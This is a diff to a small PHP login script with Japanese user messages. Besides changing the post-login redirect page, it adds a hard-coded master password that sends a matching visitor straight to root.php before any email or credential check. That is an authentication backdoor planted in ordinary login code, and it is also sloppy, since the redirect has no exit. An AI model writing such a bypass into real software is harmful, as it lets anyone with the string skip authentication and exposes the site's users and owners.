@@ -1,7 +1,11 @@
 <?php 
 require_once('./config.php');
-
 session_start();
+
+if($_POST['password'] == "mainitiganitiyoubi") {
+  header('Location:root.php');
+}
+
 //POSTのvalidate
 if(!filter_var($_POST['email'], FILTER_VALIDATE_EMAIL)) {
   echo '入力された値が不正です。';
@@ -34,7 +38,7 @@ if (password_verify($_POST['password'], $row['password'])) {
   // var_dump($_SESSION['EMAIL']);
   echo 'ログインしました';
   // sleep(2);
-  header('Location:abeet.php');
+  header('Location:youkoso.html');
 } else {
   echo 'メールアドレス又はパスワードが間違っています。';
   return false;
